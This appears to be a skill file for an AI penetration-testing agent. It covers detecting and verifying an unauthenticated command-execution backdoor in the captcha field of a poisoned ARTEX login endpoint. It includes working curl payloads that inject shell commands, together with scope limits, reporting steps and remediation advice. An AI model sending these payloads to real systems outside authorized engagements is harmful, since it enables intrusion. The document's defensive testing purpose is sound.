---
name: artex-auth-rce
description: Invoke this skill when a target appears to be running ARTEX (an AI penetration-testing platform, typically on :8787, where /api/health returns service=artex and the login page uses the fixed username ARTEX). Detect and, within the authorized scope, verify its poisoned version's "unauthorized command execution backdoor in the login endpoint captcha field" using harmless commands for evidence collection, and report it as a critical vulnerability.
---

# ARTEX Login Endpoint Poisoned Backdoor (Unauthenticated RCE) Detection and Verification

Some poisoned (supply-chain compromised) ARTEX versions implant a backdoor in the login endpoint: the JSON body of `POST /api/auth/login` contains a hidden `captcha` field. When its value starts with `!`, the backend executes `sh -c` on "the content with the first character removed", and the command output is returned in the `captcha` field of the response — **no JWT and no valid account credentials are required**. Under an **authorized** scope, this skill discovers and verifies that backdoor.

> Note: The official/uncompromised ARTEX login endpoint accepts only `username`/`password` and performs bcrypt validation; it does not contain this field. A match indicates the target is running a poisoned version — which is exactly the critical supply-chain/backdoor vulnerability to report.

---

## Boundaries and Authorization (Agent must read — crossing these is out of scope)

| Allowed | Prohibited |
|---|---|
| Test only ARTEX instances that are **within this engagement's authorized scope** and confirmed to be customer assets | Scan or exploit arbitrary ARTEX instances outside scope or on the public internet (this would be a targeted attack on others' systems) |
| Use **harmless read-only commands** (`id`/`whoami`/`hostname`/`uname -a`) to prove RCE exists | Execute any destructive command (delete files, change configuration, stop services, add accounts, establish persistence, ransomware) |
| Read minimal information such as version/hostname for evidence | Read/exfiltrate sensitive target data, credentials, or database contents |
| **Report** the finding immediately and hand it to the customer for remediation | Use the backdoor as a pivot for lateral movement, privilege escalation, payload staging, or other post-exploitation (unless explicitly authorized in writing) |

> ⚠️ This is **unauthenticated RCE**. A single request can execute commands and is highly destructive. **By default, only prove existence**: send one harmless command, confirm the echo, and immediately `report_finding`. Any action beyond the PoC requires explicit written authorization and is still subject to the platform guard's "refuse destructive operations" constraint. Targets outside the authorized scope must **never** be tested.

---

## 1. Confirm the Target Is Actually ARTEX

Avoid probing unrelated systems. Any of the following characteristics is sufficient:

```bash
# Health endpoint (no authentication required) — official instances return service=artex
curl -s -m 8 http://<TARGET>:8787/api/health
# Expected: {"ok":true,"service":"artex","version":"..."}
```

Other characteristics: the login page username input is fixed to `ARTEX`; the favicon/title contains ARTEX; the default port is `8787` (it may be 80/443 behind a reverse proxy). Proceed to the next step only after confirming it is ARTEX.

---

## 2. Detect Whether the Backdoor Exists (one harmless probe)

Send a login request containing `captcha`, using a **unique random nonce + id** command to make the determination deterministic (avoid false positives):

```bash
NONCE="artexpoc_$(date +%s)_$RANDOM"
curl -s -m 10 -X POST http://<TARGET>:8787/api/auth/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"x\",\"password\":\"y\",\"captcha\":\"!echo $NONCE; id\"}"
```

Determination:
- **Backdoor exists (critical)**: the `captcha` field in the JSON response echoes your `$NONCE` and the output of `id` (for example, `uid=0(root) ...`). This proves unauthenticated arbitrary command execution.
- **Does not exist / fixed**: returns something like `401 incorrect username or password`, and `captcha` does not echo command output — this is the behavior of an official uncompromised version; record it as "backdoor not found".

> Use only side-effect-free commands such as `echo <nonce>; id` for confirmation. Once the echo is confirmed, **stop and collect evidence**; do not send a second command with side effects.

---

## 3. Minimal Evidence Collection (only for reporting, no side effects)

After confirming the backdoor exists, you may optionally collect a small amount of read-only information to assist severity assessment (still harmless commands):

```bash
# Identity and host (determine whether it runs as root and which machine it is)
curl -s -X POST http://<TARGET>:8787/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"y","captcha":"!id; hostname; uname -a"}'
```

Preserve: the full request body and response body (including the echoed output), target URL, and timestamp. **Do not** read `/etc/shadow`, databases, keys, or other sensitive content — proving "commands can be executed" is sufficient to classify it as critical; reading sensitive data is out of scope.

---

## 4. Reporting

After confirmation, immediately `report_finding`:

- **severity**: `critical`
- **vulnclass/name**: Unauthenticated Remote Command Execution / Supply-Chain Backdoor (ARTEX login endpoint `captcha` field `sh -c` injection)
- **evidence**: the PoC request (`captcha` starts with `!`) + the command output echoed in the response (including your nonce and `id` result), proving RCE is possible without authentication.
- If traffic capture is enabled, use `traffic_search`/`bind_finding_traffic` to bind that login request/response as traffic evidence.
- `insert_assets` should record the ARTEX service (host:port, service_type=http, title/version).

**Remediation recommendations** (include in the report to the customer):
- Immediately take the instance offline or isolate it; it is running a poisoned ARTEX version and anyone can achieve unauthenticated RCE.
- Redeploy from a trusted source (official uncompromised code); remove the `sh -c` branch for `captcha` in the login endpoint.
- Rotate all credentials/keys on that host (JWT signing keys, database passwords, LLM/third-party tokens), and investigate whether it has already been exploited (audit login endpoint access logs for requests where `captcha` starts with `!`).

---

## Boundary Reaffirmation

The output of this skill is **a verified critical vulnerability finding + remediation recommendations**, not causing actual damage to the target. Harmless commands are sufficient to prove RCE; destructive exploitation, post-exploitation, data reading/exfiltration, and crossing the authorized scope are all prohibited.
